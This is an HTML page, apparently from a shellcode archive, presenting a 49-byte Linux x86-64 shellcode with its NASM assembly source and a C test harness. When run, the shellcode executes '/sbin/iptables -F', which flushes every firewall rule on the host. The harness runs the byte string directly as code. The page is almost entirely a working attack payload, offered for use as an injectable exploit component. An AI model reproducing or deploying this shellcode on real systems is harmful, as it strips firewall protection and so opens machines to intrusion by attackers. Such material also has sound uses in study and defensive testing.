<html><head><title>Linux/x86-64 - execve(/sbin/iptables, [/sbin/iptables, -F], NULL) - 49 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
    Title: Linux/x86-64 - execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL) - 49 bytes
    Author: 10n1z3d &lt;10n1z3d[at]w[dot]cn&gt;
    Date: Fri 09 Jul 2010 03:26:12 PM EEST
     
     
    Source Code (NASM):
     
    section .text
        global _start
         
    _start:
        xor     rax, rax
        push    rax
        push    word 0x462d
        mov     rcx, rsp
         
        mov     rbx, 0x73656c626174ffff
        shr     rbx, 0x10
        push    rbx
        mov     rbx, 0x70692f6e6962732f
        push    rbx
        mov     rdi, rsp
         
        push    rax
        push    rcx
        push    rdi
        mov     rsi, rsp
         
        ; execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL);
        mov     al, 0x3b
        syscall
*/
 
#include &lt;stdio.h&gt;
 
char shellcode[] = &quot;\x48\x31\xc0\x50\x66\x68\x2d\x46\x48\x89\xe1\x48\xbb\xff\xff&quot;
                   &quot;\x74\x61\x62\x6c\x65\x73\x48\xc1\xeb\x10\x53\x48\xbb\x2f\x73&quot;
                   &quot;\x62\x69\x2f\x69\x70\x53\x48\x89\xe7\x50\x51\x57\x48\x89\xe6&quot;
                   &quot;\xb0\x3b\x0f\x05&quot;;
                    
int main()
{
    printf(&quot;Length: %d bytes.\n'&quot;, strlen(shellcode));
    (*(void(*)()) shellcode)();
     
    return 0;
} 

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
